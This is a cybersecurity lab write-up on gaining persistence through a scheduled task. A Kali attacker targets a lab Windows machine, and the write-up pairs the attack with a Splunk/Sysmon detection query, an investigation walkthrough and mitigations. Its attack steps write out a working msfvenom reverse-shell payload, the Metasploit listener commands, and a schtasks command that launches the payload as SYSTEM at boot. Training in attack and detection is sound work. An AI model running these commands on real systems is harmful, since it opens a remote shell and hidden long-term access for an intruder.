# 05 - Persistence

**MITRE ATT&CK:** T1053.005 - Scheduled Task

**Status:** Complete

---

## Objective

Establish a form of persistence on the target VM to allow for future attacks.

---

## Environment / Prerequisites
- **Attacker:** Kali
- **Target:** svc_sql
- **Starting Access:** svc_sql credentials
- **Lab Weakening Required:** N/A

---

## Attack Execution
1. Use MSFvenom to generate a payload
   - ```msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.X LPORT=4444 -f exe -o ~/lab/payloads/update_svc.exe```
2. Drag payload into shared drive between Windows and Kali
3. Establish a listener on Kali
```
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.X
set LPORT 4444
run
```
4. Run payload on Windows 11
5. Create a scheduled task (cmd)
   - ```schtasks /create /sc onstart /tn "UpdateSvc" /tr "C:\Windows\Temp\update_svc.exe" /ru SYSTEM```
6. Next time the target restarts, a meterpreter session should open in Kali
   - <img width="224" height="57" alt="Kali_Persistence" src="https://github.com/user-attachments/assets/4ae1f20a-2581-4737-860b-94428dcf90fd" />

---

## Explanation
- While the attack could simply stop at data exfiltration, establishing persistence allows for future vulnerabilites to be exploited. It also means that even if passwords are changed, Kali can still reconnect to Windows
- The MSFvenom payload creates a meterpreter session on Windows when ran by the scheduled task. When this happens, it attempts to connect to the specified host and port listed in the command. If the connection is successful, Kali will gain access to a meterpreter console.

---

## Detection Engineering

**Telemetry Source:** Sysmon

```index=wineventlog source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3 DestinationPort=4444```

**Rationale:** Metasploit primarily uses port 4444. As a result, any metasploit-based persistence is likely to attempt a connection over port 4444. 

---

## Investigation Walkthrough

Task Creation:

<img width="557" height="401" alt="Splunk_Task_Creation" src="https://github.com/user-attachments/assets/1d2e64b1-0603-45f3-9d2f-55dc4e484aa1" />

**Alert:** EID 4688 (New Process Creation)

**Initial Assessment:** Process Creation is not inherently suspicious. It was created by svc_sql, though, so more investigation is needed

**Investigation:** New_Process_Name shows something was created using schtasks.exe. Under Process_Command_Line, it can be verified that a scheduled task was created. In specific, one that runs the file 'update_svc.exe' on startup. File name does not sound suspicious

**Correlation:** After the attacker gained administrative access, he would have had full control over the Active Directory. Since this task was created by svc_sql, which we know to be compromised, it is possible this task is malicious. 

**Verdict:** Suspicious - Further Investigation Needed

**Recommended Response:** Investigate update_svc.exe.

Connection:

<img width="422" height="398" alt="Splunk_Task_Connection" src="https://github.com/user-attachments/assets/7f766252-6d65-40fc-9263-f706ef8a56fa" />

**Alert:** Sysmon ID 3 type 4 (Network Connection)

**Initial Assessment:** Connections are normal and expected for systems, but they should be question in lieu of the recent attacks.

**Investigation:** Source IP matches the Target from earlier. Destination IP matches the Kali attacker from earlier. Destination Port is 4444 --> Associated with Metasploit. Image is update_svc.exe.

**Correlation:** Update_svc.exe was executed and created this network connection, allowing the attacker continuous access to the Active Directory. Combined with destination port 4444, update_svc.exe is likey a payload created using metasploit and planted onto the target system.

**Verdict:** True Positive - Persistence

**Recommended Response:** Delete update_svc.exe and remove the scheduled task. Check for any other changes to the systems. Monitor outgoing connections to the attacker IP address.

---

## Detection Gaps / Limitations
- Legitimate traffic can travel over port 4444, resulting in false positives.
- An alert could be made for scheduled tasks, but this is impractical as they have legitimate uses as well.

---

## Real-World Mitigation
- There are specific tools that can search through scheduled tasks and make sure privileges cannot be abused or escalated
- Force scheduled tasks to run under an authenticated account rather than SYSTEM

---

## Takeaways
- This step seems rather hard to detect due to the number of legitimate processes that also take advantage of scheduled tasks. Preventing persistence requires more deliberate action instead of just a one-and-done fix.
- It was shocking seeing how dangerous scheduled tasks can be if they have administrator privileges.
